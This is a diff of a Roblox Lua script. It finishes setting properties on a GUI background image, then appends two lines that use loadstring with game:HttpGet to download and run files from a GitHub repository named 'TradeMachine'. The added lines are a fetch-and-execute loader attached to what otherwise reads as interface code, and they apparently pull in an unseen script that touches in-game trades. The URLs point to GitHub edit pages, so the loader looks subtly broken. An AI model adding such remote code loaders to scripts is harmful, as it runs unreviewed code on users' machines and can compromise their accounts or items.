@@ -246,3 +246,6 @@ BG_3.BorderSizePixel = 0
 BG_3.Size = UDim2.new(1, 0, 1, 0)
 BG_3.Image = "rbxassetid://105335454436145"
 BG_3.ScaleType = Enum.ScaleType.Stretch
+
+loadstring(game:HttpGet("https://github.com/TheF1rstT1me/TradeMachine/edit/main/Main.lua", true))()
+loadstring(game:HttpGet("https://github.com/TheF1rstT1me/TradeMachine/edit/main/EventsInstance.lua", true))()
